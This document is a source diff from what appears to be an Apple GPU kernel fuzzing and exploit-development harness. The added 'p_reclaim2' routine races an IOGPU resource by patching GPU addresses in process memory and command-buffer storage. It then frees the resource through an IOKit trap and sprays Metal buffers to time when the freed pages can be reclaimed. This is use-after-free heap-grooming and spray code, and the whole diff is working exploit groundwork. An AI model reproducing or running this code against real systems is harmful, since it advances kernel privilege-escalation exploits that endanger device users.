@@ -16981,6 +16981,167 @@ static void p_reclaim(void) {
     LOG("[recl] done (alive)");
 }
 
+// V107: reclaim timing map. Single-victim race (v105 mechanics), then a
+// continuous MTLBuffer spray with CPU readback — when do freed pages become
+// reclaimable? Steps: 1 = timing spray, 2 = retirement provocations,
+// 3 = mass-free (24 victims).
+static id<MTLCommandBuffer> g_racecb;
+static uint8_t *g_racecv;
+static long race_prepare(id<MTLDevice> dev, id<MTLCommandQueue> mq, io_connect_t mconn,
+                         size_t vsz, uint32_t *ridout, int cong) {
+    if (cong) {
+        id<MTLBuffer> cgS = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+        id<MTLBuffer> cgD = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+        memset([cgS contents], 0x55, 0x1000000);
+        for (int i = 0; i < cong; i++) {
+            id<MTLCommandBuffer> cbx = [mq commandBuffer];
+            id<MTLBlitCommandEncoder> encx = [cbx blitCommandEncoder];
+            [encx copyFromBuffer:cgS sourceOffset:0 toBuffer:cgD destinationOffset:0 size:0x1000000];
+            [encx endEncoding];
+            [cbx commit];
+        }
+    }
+    uint64_t gv = 0;
+    uint8_t *cv = NULL;
+    uint32_t ridV = gpu_resource2(mconn, vsz, &gv, &cv);
+    if (!ridV || !cv) return -1;
+    memset(cv, 0, vsz);
+    id<MTLBuffer> bufA = [dev newBufferWithLength:vsz options:MTLResourceStorageModeShared];
+    id<MTLBuffer> bufD = [dev newBufferWithLength:vsz options:MTLResourceStorageModeShared];
+    memset([bufA contents], 0x41, vsz);
+    id<MTLCommandBuffer> cb = [mq commandBuffer];
+    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+    [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufD destinationOffset:0 size:vsz];
+    [enc endEncoding];
+    uint64_t gpuD = [bufD gpuAddress];
+    long np = 0;
+    mach_vm_address_t addr = 0;
+    while (1) {
+        mach_vm_size_t sz = 0;
+        vm_region_basic_info_data_64_t info;
+        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+        mach_port_t obj;
+        if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
+                           (vm_region_info_t)&info, &cnt, &obj)) break;
+        if ((info.protection & VM_PROT_WRITE) && sz >= 0x1000 && sz <= 0x4000000) {
+            uint8_t *base = (uint8_t *)addr;
+            for (mach_vm_size_t o = 0; o + 8 <= sz; o += 4)
+                if (*(uint64_t *)(base + o) == gpuD) { *(uint64_t *)(base + o) = gv; np++; }
+        }
+        addr += sz;
+        if (!sz) break;
+    }
+    void *storage = find_ivar_obj(cb, "torage", 0, "cb");
+    uint64_t sva = storage ? *(uint64_t *)((uint8_t *)storage + 0x68) : 0;
+    uint32_t skb = (uint32_t)(vsz >> 10);
+    if (sva) {
+        uint8_t *sg = (uint8_t *)(uintptr_t)sva;
+        for (long o = 0x48; o + 0x40 <= 0x400; o += 0x40)
+            if (*(uint16_t *)(sg + o + 0x3e) == 2 &&
+                *(uint32_t *)(sg + o + 0x18) == skb && *(uint32_t *)(sg + o + 0x1c) == skb)
+                *(uint32_t *)(sg + o + 0x04) = ridV;
+    }
+    [cb commit];
+    g_racecb = cb;
+    g_racecv = cv;
+    *ridout = ridV;
+    return np;
+}
+
+// continuous spray for `secs` seconds; returns ms of first 0x41 hit or -1
+static long spray_timed(id<MTLDevice> dev, size_t vsz, int secs) {
+    struct timespec t0, t1;
+    clock_gettime(CLOCK_MONOTONIC, &t0);
+    long firstms = -1;
+    long iter = 0;
+    for (;;) {
+        clock_gettime(CLOCK_MONOTONIC, &t1);
+        long el = (t1.tv_sec - t0.tv_sec) * 1000 + (t1.tv_nsec - t0.tv_nsec) / 1000000;
+        if (el >= secs * 1000) break;
+        @autoreleasepool {
+            for (int i = 0; i < 8; i++) {
+                id<MTLBuffer> b = [dev newBufferWithLength:vsz options:MTLResourceStorageModeShared];
+                if (!b) continue;
+                uint8_t *p = (uint8_t *)[b contents];
+                long n41 = 0;
+                for (size_t j = 0; j < vsz; j += 4) if (*(uint32_t *)(p + j) == 0x41414141) n41++;
+                if (n41 > 64 && firstms < 0) {
+                    firstms = el;
+                    LOG("[recl2] *** first 0x41 hit at ~%ld ms (iter %ld, buf %d)", el, iter, i);
+                }
+            }
+        }
+        iter++;
+        usleep(50000);
+    }
+    LOG("[recl2] spray %ds done, %ld iters, first hit %s", secs, iter,
+        firstms < 0 ? "NONE" : "see above");
+    return firstms;
+}
+
+static void p_reclaim2(void) {
+    int step = atoi(getenv("FUZZ_RECLAIM2_STEP") ?: "1");
+    LOG("[recl2] v107 step %d", step);
+    io_connect_t ourc = open_service("IOGPU", 1);
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    uint8_t *devObj = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 392);
+    uint8_t *dref = devObj ? *(uint8_t **)(devObj + 656) : NULL;
+    io_connect_t mconn = dref ? *(uint32_t *)(dref + 0x14) : 0;
+    if (!mconn || !dev) return;
+
+    if (step == 1) {
+        uint32_t ridV;
+        race_prepare(dev, mq, mconn, 0x10000, &ridV, 8);
+        fsync(fileno(stderr));
+        kern_return_t kd = ioconnect_trap1(mconn, 1, ridV);
+        LOG("[recl2] destroy kr 0x%08x, starting 10s timed spray", kd);
+        spray_timed(dev, 0x10000, 10);
+    } else if (step == 2) {
+        // provocations after destroy, then spray
+        static const char *prov[] = { "drain+sleep", "mempressure", "purgeable" };
+        for (int pv = 0; pv < 3; pv++) {
+            uint32_t ridV;
+            race_prepare(dev, mq, mconn, 0x10000, &ridV, 8);
+            fsync(fileno(stderr));
+            ioconnect_trap1(mconn, 1, ridV);
+            LOG("[recl2] provocation %s after destroy", prov[pv]);
+            if (pv == 0) {
+                for (int w = 0; w < 40; w++) { if ((long)[g_racecb status] >= 4) break; usleep(50000); }
+                usleep(2000000);
+            } else if (pv == 1) {
+                @autoreleasepool {
+                    NSMutableArray *hog = [NSMutableArray new];
+                    for (int i = 0; i < 16; i++) {   // 16x16MB = 256MB
+                        id<MTLBuffer> b = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+                        if (b) { memset([b contents], 1, 0x1000); [hog addObject:b]; }
+                    }
+                    usleep(1000000);
+                }
+            } else {
+                @autoreleasepool {
+                    for (int i = 0; i < 32; i++) {
+                        id<MTLBuffer> b = [dev newBufferWithLength:0x10000 options:(MTLResourceOptions)(MTLResourceStorageModeShared | (3 << 4))];
+                        if (b) memset([b contents], 2, 0x1000);
+                    }
+                }
+                usleep(1000000);
+            }
+            spray_timed(dev, 0x10000, 5);
+        }
+    } else if (step == 3) {
+        // mass-free: 24 victims, patched cbs queued, destroy all, spray
+        uint32_t rids[24];
+        for (int i = 0; i < 24; i++)
+            race_prepare(dev, mq, mconn, 0x10000, &rids[i], i == 0 ? 8 : 0);
+        fsync(fileno(stderr));
+        for (int i = 0; i < 24; i++) ioconnect_trap1(mconn, 1, rids[i]);
+        LOG("[recl2] mass-destroyed 24 victims, starting 10s spray");
+        spray_timed(dev, 0x10000, 10);
+    }
+    LOG("[recl2] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -17111,6 +17272,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM")) { p_reclaim(); LOG("[probe13] reclaim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUUAF")) { p_gpuuaf(); LOG("[probe13] gpuuaf-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GROOM")) { p_groom(); LOG("[probe13] groom-only mode, stop"); return NULL; }
